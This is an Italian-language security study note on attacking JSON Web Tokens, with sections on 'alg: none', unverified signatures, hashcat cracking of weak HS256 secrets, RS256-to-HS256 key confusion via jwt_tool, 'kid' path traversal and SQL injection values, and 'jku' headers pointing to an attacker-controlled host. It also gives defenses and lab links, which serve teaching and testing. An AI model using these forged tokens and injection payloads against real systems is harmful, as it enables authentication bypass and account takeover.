---
tipo: concetto
tag: [web, owasp, crypto, tool]
fase: 3
fonti: 4
aggiornato: 2026-06-26
stato: maturo
aliases: ["Attacchi JWT", "JWT Attacks"]
---

# Attacchi JWT

> [!warning] Uso etico
> Manomettere token di sessione e tentare bypass di firma **solo** su lab autorizzati o target in scope. Forgiare un JWT di un altro utente su un sistema reale senza permesso è accesso abusivo.

## In breve
Un **JWT** (JSON Web Token) è un token compatto auto-contenuto: `header.payload.signature`, ognuno base64url. È trattato in [[Cookie e JWT]] e usato per [[Autenticazione e Gestione Sessioni]] stateless. Il problema: se il server **si fida del token senza verificarne correttamente la firma**, l'attaccante — che controlla interamente il token lato client — può forgiarne uno arbitrario.

```text
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCIsImFkbWluIjpmYWxzZX0.<firma>
└── header {"alg":"HS256"}  └── payload {"sub":"guest","admin":false}  └── HMAC
```

## Anatomia e superficie d'attacco
- **header**: contiene `alg` (algoritmo) e spesso `kid`, `jku`, `jwk`, `x5u` (riferimenti alla chiave). Ognuno di questi è un vettore.
- **payload**: claim (`sub`, `role`, `admin`, `exp`...). Manometterli è il fine.
- **signature**: ciò che dovrebbe impedire la manomissione. Tutti gli attacchi mirano a renderla irrilevante.

## 1. `alg: none` (firma nulla)
Se la libreria accetta `alg: none`, la firma è opzionale: si rimuove e si riscrive il payload.
```text
header:  {"alg":"none","typ":"JWT"}
payload: {"sub":"administrator","admin":true}
token:   eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
                                                              ↑ firma vuota (a volte si lascia il "." finale)
```

## 2. Firma non verificata
Alcune implementazioni *decodificano* ma non *verificano* (`decode()` invece di `verify()`). Si cambia qualsiasi claim e si lascia la firma originale (o una qualsiasi): il server non controlla. Si individua cambiando un byte della firma — se il token resta valido, la firma è ignorata.

## 3. Chiave HMAC debole (brute-force HS256)
Se `alg` è HS256 e il segreto è una password debole, si cracca offline:
```bash
# hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
# poi si rifirma con il segreto trovato
```

## 4. Algorithm confusion (RS256 → HS256)
Il server usa RS256 (chiave **pubblica** per verificare, privata per firmare). Se la libreria sceglie l'algoritmo in base all'header senza vincolarlo, l'attaccante cambia `alg` in HS256 e **firma il token con HMAC usando la chiave pubblica RSA come segreto**. Il server, in modalità HS256, usa la stessa chiave pubblica (che è nota!) per verificare → match.
```bash
# 1. recupera la chiave pubblica (endpoint /jwks.json, certificato TLS, o derivata da 2 token)
# 2. rifirma in HS256 usando il PEM pubblico come secret HMAC
python3 jwt_tool.py <TOKEN> -X k -pk public.pem    # exploit di key confusion
```

## 5. Iniezione tramite header `kid`
`kid` (Key ID) dice al server quale chiave usare. Se è usato per leggere un file o una query senza sanitizzazione:
```text
# Path traversal → forza una chiave nota (es. /dev/null = stringa vuota → firma con segreto "")
{"alg":"HS256","kid":"../../../../dev/null"}
# SQL injection nel kid
{"alg":"HS256","kid":"x' UNION SELECT 'attackerkey"}
```

## 6. `jku` / `jwk` / `x5u` — chiave fornita dall'attaccante
- **`jwk`**: header che *embedda* la chiave pubblica. Se il server si fida, gli si fornisce la propria chiave e si firma con la corrispondente privata.
- **`jku`** (JWK Set URL): URL da cui scaricare le chiavi. Se non c'è allow-list di host, si punta a un proprio JWKS (eventualmente via SSRF / open redirect verso un host fidato).
```text
{"alg":"RS256","jku":"https://ATTACKER/jwks.json","kid":"mykey"}
```

## Tooling
**jwt_tool** è lo strumento di riferimento (`-M` scan, `-T` tamper, `-C` crack, `-X` exploit). [[Burp Suite]] ha l'estensione **JWT Editor** (firma, attack `none`, embedded JWK, key confusion). jwt.io per ispezione rapida.

## Impatto
Forgiatura di sessione → **privilege escalation** (utente → admin), impersonificazione di qualsiasi account, bypass completo dell'autenticazione. Spesso pre-condizione per accessi totali.

## Come difendersi
1. **Vincola l'algoritmo** lato server (es. accetta *solo* RS256); non lasciare che l'header decida.
2. **Rifiuta `alg: none`** e verifica *sempre* la firma (`verify`, non `decode`).
3. **Segreti HMAC robusti** (alta entropia), mai password da dizionario.
4. **Non fidarsi di `jku`/`jwk`/`x5u`/`kid` controllati dal client**: usa una allow-list di chiavi/host; valida e sanitizza `kid`.
5. Imposta ed **enforce** `exp`, `iss`, `aud`; usa `jti` per revoca/replay.
6. Usa librerie aggiornate e mature; preferisci chiavi asimmetriche con rotazione.

## Lab
- PortSwigger — JWT attacks (lab: "JWT authentication bypass via unverified signature", "via flawed signature verification", "weak signing key", "jwk header injection", "jku header injection", "kid header path traversal", "algorithm confusion"): https://portswigger.net/web-security/jwt
- HackTricks — JWT vulnerabilities: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- ticarpi/jwt_tool wiki (playbook completo): https://github.com/ticarpi/jwt_tool/wiki

## Collegamenti
- [[Cookie e JWT]]
- [[Autenticazione e Gestione Sessioni]]
- [[OAuth 2.0 e OpenID Connect Attacks]]
- [[Burp Suite]]
- [[OWASP Top 10]]

## Fonti
- PortSwigger — JWT attacks: https://portswigger.net/web-security/jwt
- ticarpi/jwt_tool: https://github.com/ticarpi/jwt_tool
- Auth0 — JWT handbook / RFC 7519: https://datatracker.ietf.org/doc/html/rfc7519
- OWASP — JSON Web Token Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
